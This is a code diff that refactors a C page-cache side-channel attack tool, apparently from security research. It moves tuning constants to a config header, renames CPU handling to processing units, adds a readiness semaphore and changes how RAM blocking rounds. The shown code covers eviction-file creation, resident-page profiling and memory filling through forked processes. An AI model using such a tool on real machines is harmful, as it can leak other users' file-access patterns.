@@ -64,6 +64,7 @@
 #include "util/dynarray/dynarray.h"
 #include "util/list/list.h"
 #include "util/pageflags/pageflags.h"
+#include "config.h"
 
 
 /*-----------------------------------------------------------------------------
@@ -74,21 +75,10 @@
 //#define _DEBUG_
 //#define _DETAILED_EVICTION_SET_STAT_
 #define FILE_COPY_BS (1*1024*1024)
-#define RAM_HIT_THRESHOLD 1000
-
 // file names, paths
 #define EVICTION_FILENAME "eviction.ram"
 #define HISTOGRAM_FILENAME_TIME "histogram_time.csv"
 #define HISTOGRAM_FILENAME_MEM "histogram_mem.csv"
-char* OBJ_SEARCH_PATHS[] =
-{
-    "/bin", "/dev/shm", "/etc", /*"/home",*/ "/lib", "/opt",
-    "/run", "/sbin", "/snap", "/tmp", "/usr", "/var", NULL
-};
-// NOTE by default the update resolution of /proc/meminfo is 1s
-#define MEMINFO_PATH "/proc/meminfo"
-#define MEMINFO_AVAILABLE_MEM_TAG "MemAvailable:"
-#define RANDOM_SOURCE "/dev/urandom"
 
 // defines used for parsing command line arguments
 #define SWITCHES_COUNT 3
@@ -122,48 +112,6 @@ const size_t SWITCHES_ARG_COUNT[SWITCHES_COUNT] = { 0, 1, 1 };
 #define ARRAY_INIT_CAP 10
 #define IN_LINE_MAX 255
 
-
-// defines regarding the attacked system
-#define DEF_PAGE_SIZE 4096
-#define READAHEAD_PAGES 32
-
-
-// defines for tuning the attack
-#define DEF_USE_ATTACK_WS 1
-#define DEF_USE_ATTACK_BS 1
-#define DEF_MLOCK_SELF 1
-
-#define DEF_WS_SEARCH_PATHS OBJ_SEARCH_PATHS
-#define DEF_WS_PS_ADD_THRESHOLD READAHEAD_PAGES
-#define DEF_WS_ACCESS_THREAD_COUNT 16
-#define DEF_WS_ACCESS_THREADS_PER_CORE 4
-#define DEF_WS_ACCESS_SLEEP_TIME_NS 4000000UL
-#define DEF_WS_ACCESS_SLEEP_TIME_S 0UL
-#define DEF_WS_EVALUATION 1
-#define DEF_WS_EVICTION_IGNORE_EVALUATION 1
-#define DEF_WS_EVALUATION_SLEEP_TIME_NS 0UL
-#define DEF_WS_EVALUATION_SLEEP_TIME_S 1UL
-// TODO not implemented
-#define DEF_WS_PROFILE_UPDATE_ALL_X_EVALUATIONS 60
-
-#define DEF_MINCORE_CHECK_ALL_X_BYTES (DEF_PAGE_SIZE * 256UL)
-
-#define DEF_BS_MEMINFO_FILE_PATH MEMINFO_PATH
-#define DEF_BS_FILLUP_SIZE (16 * 1024 * 1024UL)
-#define DEF_BS_MIN_AVAILABLE_MEM (256 * 1024 * 1024UL) //256
-#define DEF_BS_MAX_AVAILABLE_MEM (272 * 1024 * 1024UL) // 272
-#define DEF_BS_EVALUATION_SLEEP_TIME_NS 0UL
-#define DEF_BS_EVALUATION_SLEEP_TIME_S 1UL
-
-#define DEF_SS_THREAD_COUNT 0
-
-#define DEF_SAMPLE_WAIT_TIME_NS 10000UL
-#define DEF_EVENT_WAIT_TIME_NS 50000000UL
-
-#define USE_NANOSLEEP
-
-#define HYPERTHREADS_PER_CORE 2
-
 // output TAGS with ANSI colors
 #define PENDING "\x1b[34;1m[PENDING]\x1b[0m "
 #define INFO "\x1b[34;1m[INFO]\x1b[0m "
@@ -174,8 +122,7 @@ const size_t SWITCHES_ARG_COUNT[SWITCHES_COUNT] = { 0, 1, 1 };
 #define USAGE "\x1b[31;1m[USAGE]\x1b[0m "
 #define WARNING "\x1b[33;1m[WARNING]\x1b[0m "
 
-
-// Thread TAGS
+// component TAGS
 #define WS_MGR_TAG "[WS Manager] "
 #define BS_MGR_TAG "[BS Manager] "
 #define SS_Thread_TAG "[SS Thread] "
@@ -248,7 +195,7 @@ typedef struct _AttackWorkingSet_
     List tmp_non_resident_files_;
     size_t ps_add_threshold_;
     size_t access_thread_count_;
-    size_t access_threads_per_core_;
+    size_t access_threads_per_pu_;
     DynArray access_threads_;
     struct timespec access_sleep_time_;
     struct timespec evaluation_sleep_time_;
@@ -263,6 +210,8 @@ typedef struct _AttackBlockingSet_
     size_t min_available_mem_;
     size_t max_available_mem_;
     struct timespec evaluation_sleep_time_;
+    sem_t initialized_sem_;
+    uint8_t initialized_;
 } AttackBlockingSet;
 
 typedef struct _AttackSuppressSet_
@@ -366,8 +315,8 @@ void usageError(char *app_name);
  */
 static int running = 1;
 static int eviction_running = 0;
-static int used_cpus = 0;
-static int MAX_CPUS = 0;
+static int used_pus = 0;
+static int MAX_PUS = 0;
 static size_t PAGE_SIZE = 0;
 
 
@@ -423,6 +372,10 @@ int main(int argc, char* argv[])
     pthread_attr_t thread_attr;
 
 
+    // set output buffering to lines (needed for automated testing)
+    setvbuf(stdout, NULL, _IOLBF, 0);
+    
+
     // process command line arguments
     if(parseCmdArgs(&argv[1], argc - 1, &cmd_line_conf, &parsed_cmd_line) != 0) {
         usageError(argv[0]);
@@ -435,15 +388,15 @@ int main(int argc, char* argv[])
 
 
     // get number of cpus
-    MAX_CPUS = get_nprocs();
-    printf(INFO "%d CPUs available...\n", MAX_CPUS);
+    MAX_PUS = get_nprocs();
+    printf(INFO "%d PUs available...\n", MAX_PUS);
 
 
     //  limit execution on CPU 0 by default
     CPU_ZERO(&cpu_mask);
     CPU_SET(0, &cpu_mask);
     sched_setaffinity(0, sizeof(cpu_mask), &cpu_mask);
-    used_cpus = (used_cpus + HYPERTHREADS_PER_CORE < MAX_CPUS) ? used_cpus + HYPERTHREADS_PER_CORE : used_cpus;
+    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
 
     // later used to set thread affinity
     pthread_attr_init(&thread_attr);
@@ -751,26 +704,14 @@ int main(int argc, char* argv[])
         printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
                attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
     }
-    printf(OK "Ready...\n");
+   
 
     // next thread(s) by default on different core
     CPU_ZERO(&cpu_mask);
-    CPU_SET(used_cpus, &cpu_mask);
+    CPU_SET(used_pus, &cpu_mask);
     pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
-    used_cpus = (used_cpus + HYPERTHREADS_PER_CORE <= MAX_CPUS) ? used_cpus + HYPERTHREADS_PER_CORE : used_cpus;
+    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
 
-    // manager for blocking set
-    if(attack.use_attack_bs_ && pthread_create(&attack.bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
-    {
-        printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
-    }
-
-    // manager for working set
-    if(attack.use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
-    {
-        printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
-    }
-   
     // readahead surpressing threads for target
     for(size_t i = 0; i < attack.ss_thread_count_; i++)
     {
@@ -785,7 +726,22 @@ int main(int argc, char* argv[])
         dynArrayAppend(&attack.ss_threads_, &tid);
     }
 
+    // manager for working set
+    if(attack.use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
+    {
+        printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
+    }
 
+    // manager for blocking set
+    if(attack.use_attack_bs_ && pthread_create(&attack.bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
+    {
+        printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
+    }
+
+
+    // wait till blocking set is initialized
+    sem_wait(&attack.blocking_set_.initialized_sem_);
+    printf(OK "Ready...\n");
     // main event loop
     while(running)
     {
@@ -1052,6 +1008,10 @@ int initAttackBlockingSet(AttackBlockingSet* bs)
     {
         return -1;
     }
+    if(sem_init(&bs->initialized_sem_, 0, 0) != 0)
+    {
+        return -1;
+    }
 
     return 0;
 }
@@ -1060,6 +1020,7 @@ int initAttackBlockingSet(AttackBlockingSet* bs)
 void closeAttackBlockingSet(AttackBlockingSet* bs)
 {
     dynArrayDestroy(&bs->fillup_processes_, closeFillUpProcess);
+    sem_destroy(&bs->initialized_sem_);
 }
 
 
@@ -1172,7 +1133,7 @@ void configAttack(Attack *attack)
     attack->working_set_.search_paths_ = DEF_WS_SEARCH_PATHS;
     attack->working_set_.ps_add_threshold_ = DEF_WS_PS_ADD_THRESHOLD;
     attack->working_set_.access_thread_count_ = DEF_WS_ACCESS_THREAD_COUNT;
-    attack->working_set_.access_threads_per_core_ = DEF_WS_ACCESS_THREADS_PER_CORE;
+    attack->working_set_.access_threads_per_pu_ = DEF_WS_ACCESS_THREADS_PER_PU;
     attack->working_set_.access_sleep_time_.tv_sec = DEF_WS_ACCESS_SLEEP_TIME_S;
     attack->working_set_.access_sleep_time_.tv_nsec = DEF_WS_ACCESS_SLEEP_TIME_NS;
     attack->working_set_.evaluation_sleep_time_.tv_sec = DEF_WS_EVALUATION_SLEEP_TIME_S;
@@ -1263,10 +1224,10 @@ int createRandomFile(char* filename, size_t size)
         // fallocate failed, fall back to creating eviction file from /dev/urandom
         close(fd);
 
-        FILE* rnd_file = fopen(RANDOM_SOURCE, "rb");
+        FILE* rnd_file = fopen(RANDOM_SOURCE_PATH, "rb");
         if(rnd_file == NULL)
         {
-            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), RANDOM_SOURCE);
+            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), RANDOM_SOURCE_PATH);
             return -1;
         }
         FILE* target_file = fopen(filename, "wb");
@@ -1289,7 +1250,7 @@ int createRandomFile(char* filename, size_t size)
         {
             if(fread(block, bs, 1, rnd_file) != 1)
             {
-                printf(FAIL "Error (%s) at fread: %s...\n", strerror(errno), RANDOM_SOURCE);
+                printf(FAIL "Error (%s) at fread: %s...\n", strerror(errno), RANDOM_SOURCE_PATH);
                 fclose(rnd_file);
                 fclose(target_file);
                 free(block);
@@ -1509,8 +1470,8 @@ int profileResidentPageSequences(CachedFile* current_cached_file, size_t ps_add_
         }
         else
         {
-            // add sequence if longer than threshold
-            if(sequence.length_ > ps_add_threshold)
+            // add sequence if greater equal than threshold
+            if(sequence.length_ >= ps_add_threshold)
             {
                 // add sequence pages
                 if(!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
@@ -1528,7 +1489,7 @@ int profileResidentPageSequences(CachedFile* current_cached_file, size_t ps_add_
         }
     }
     // process last found sequence
-    if(sequence.length_ > ps_add_threshold)
+    if(sequence.length_ >= ps_add_threshold)
     {
         // add sequence pages
         if(!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
@@ -1599,8 +1560,8 @@ int blockRAM(AttackBlockingSet* bs, size_t fillup_size)
     DEBUG_PRINT((DEBUG BS_MGR_TAG "Going to block %zu kB of physical memory, need %zu child processes...\n", fillup_size / 1024,
                  fillup_size / bs->def_fillup_size_));
 
-    // round down - rather keep a bit more memory free
-    for(size_t i = 1; i <= fillup_size / bs->def_fillup_size_; i++)
+    // round up
+    for(size_t i = 1; i <= (fillup_size + bs->def_fillup_size_ - 1) / bs->def_fillup_size_; i++)
     {
         child_pid = fork();
 
@@ -1814,6 +1775,11 @@ void* bsManagerThread(void *arg)
                 blockRAM(bs, mem_diff);
             }
         }
+        else if(!bs->initialized_)
+        {
+            sem_post(&bs->initialized_sem_);
+            bs->initialized_ = 1;
+        }
 
         nanosleep(&bs->evaluation_sleep_time_, NULL);
     }
@@ -1931,10 +1897,10 @@ void* wsManagerThread(void *arg)
         pthread_attr_init(&thread_data->thread_attr_);
 
         CPU_ZERO(&cpu_mask);
-        CPU_SET(used_cpus, &cpu_mask);
+        CPU_SET(used_pus, &cpu_mask);
         pthread_attr_setaffinity_np(&thread_data->thread_attr_, sizeof(cpu_set_t), &cpu_mask);
 
-        printf(WS_MGR_TAG "Thread %zu configured to run on core %d and to access %zu files.\n", t, used_cpus, thread_data->resident_files_.count_);
+        printf(WS_MGR_TAG "Thread %zu configured to run on core %d and to access %zu files.\n", t, used_pus, thread_data->resident_files_.count_);
         thread_data->running_ = 1;
         if(pthread_create(&thread_data->tid_, &thread_data->thread_attr_, pageAccessThread, thread_data) != 0)
         {
@@ -1943,10 +1909,10 @@ void* wsManagerThread(void *arg)
         }
 
         // increase to next core if wanted
-        if((t+1) % ws->access_threads_per_core_ == 0)
+        if((t+1) % ws->access_threads_per_pu_ == 0)
         {
             // NOTE has to be locked when accessed concourrently in future
-            used_cpus = (used_cpus + HYPERTHREADS_PER_CORE < MAX_CPUS) ? used_cpus + HYPERTHREADS_PER_CORE : used_cpus;
+            used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE: used_pus;
         }
     }
 
